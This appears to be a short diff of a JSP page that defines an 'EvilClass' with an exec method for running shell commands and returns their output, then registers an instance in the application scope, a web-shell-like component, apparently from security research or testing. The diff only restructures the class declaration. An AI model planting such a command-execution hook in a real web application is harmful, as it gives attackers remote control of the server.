@@ -1,8 +1,9 @@
 <%@ page import="java.io.IOException" %>
 <%@ page import="java.io.InputStream" %>
 
-<%!
-    public class EvilClass {
+<%
+    // local class declaration can work too
+    class EvilClass {
         public String exec(String cmd) {
             StringBuilder output = new StringBuilder();
             try {
@@ -17,11 +18,8 @@
                 output.append("Error executing command: ").append(e.getMessage());
             }
             return output.toString();
-//            return this.getClass().getClassLoader().toString();
         }
     }
-%>
 
-<%
     application.setAttribute("EvilClass", new EvilClass());
 %>
